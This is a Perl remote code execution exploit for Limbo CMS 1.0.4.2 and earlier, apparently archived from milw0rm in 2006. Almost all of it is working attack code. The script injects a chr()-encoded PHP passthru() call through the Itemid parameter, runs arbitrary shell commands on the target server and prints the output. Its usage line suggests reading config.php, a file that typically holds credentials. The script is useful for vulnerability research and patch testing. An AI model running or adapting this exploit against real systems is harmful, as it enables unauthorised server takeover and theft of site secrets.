#!/usr/bin/perl
##
## Limbo CMS <= 1.0.4.2 (ItemID) Remote Code Execution Exploit
## Bug Discovered by: Coloss / Epsilon (advance1[at]gmail.com) http://coded.altervista.org/limbophp.pl
## /str0ke (milw0rm.com)

use LWP::Simple;

$serv     =  $ARGV[0];
$path     =  $ARGV[1];
$command  =  $ARGV[2];
$cmd      =  "echo start_er;".
             "$command;".
             "echo end_er";

my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));

sub usage
{
        print "Limbo CMS <= 1.0.4.2 (ItemID) Remote Code Execution Exploit /str0ke (milw0rm.com)";
        print "Usage: $0 www.example.com /directory/ \"cat config.php\"\n";
        print "sever    -  URL\n";
        print "path     -  path to limbo\n";
        print "command  -  command to execute\n";
        exit ();
}

sub exploit
{
        print qq(Limbo CMS <= 1.0.4.2 (ItemID) Remote Code Execution Exploit\n/str0ke (milw0rm.com)\n\n);
        $URL = sprintf("http://%s%sindex.php?option=frontpage&Itemid=passthru($byte)",$serv,$path);
        my $content = get "$URL";
        if ($content =~ m/start_er(.*?)end_er/ms) {
                my $out = $1;
                $out =~ s/^\s+|\s+$//gs;
                if ($out) {
                        print "$out\n";
                }
        }
}

if (@ARGV != 3){&usage;}else{&exploit;}

# milw0rm.com [2006-03-01]
